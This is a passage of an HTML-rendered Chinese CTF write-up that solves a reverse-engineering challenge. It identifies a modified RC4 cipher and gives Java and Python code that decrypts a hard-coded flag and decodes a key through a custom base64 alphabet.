style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xD0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x45&lt;span style=&#34;color:#f92672&#34;&gt;};&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;en1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;en2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v1&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v7&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v7&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v2&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v7&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;懂的话就会发现这个就是一个s盒从 &lt;code&gt;0-255&lt;/code&gt; 变成 &lt;code&gt;256-1&lt;/code&gt; 的 &lt;code&gt;RC4&lt;/code&gt; 密码&lt;/p&gt;
&lt;p&gt;不懂的话直接把代码复制出来，把 &lt;code&gt;file&lt;/code&gt; 函数改写成 &lt;code&gt;main&lt;/code&gt; 函数，反向求解一下就行（因为仔细观察就可以发现 &lt;code&gt;en2&lt;/code&gt; 只对明文做了个异或运算，且异或的对象和明文本身没有关系），这里当密码学的题来做其实就好了。&lt;/p&gt;
&lt;p&gt;这是我复制后改写的 java 代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Main&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;en1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String arg7&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x100 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 256-1降序
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            v1&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 用密钥填满v1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v7_1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            arg8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v7_1&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v7_1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;en2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg8&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; arg9&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; arg9&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
            arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            arg8&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;arg8&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;[((&lt;/span&gt;arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg7&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 0x100&lt;span style=&#34;color:#f92672&#34;&gt;]));&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        String arg7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;th1s_1s_k3y!!!!!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]{&lt;/span&gt;0x8B&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xD2&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xD9&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x5D&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x95&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xFF&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x7E&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x5F&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x29&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x56&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x12&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xB9&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xEF&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xEC&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x8B&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0xD0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0x45&lt;span style=&#34;color:#f92672&#34;&gt;};&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x100&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 17&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]{};&lt;/span&gt;
        en1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg7&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
        en2&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;++)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 0xff&lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然也可以跟在第一段 python 后面继续写&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; s2n
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

en_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7+RmFXP2LWP2L6g3&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;==qi7esi&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
true_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_uppercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+/&amp;#39;&lt;/span&gt;
fake_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_uppercase
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; en_key:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;:
        key &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; c
        &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
    key &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; true_base[fake_base&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(c)]

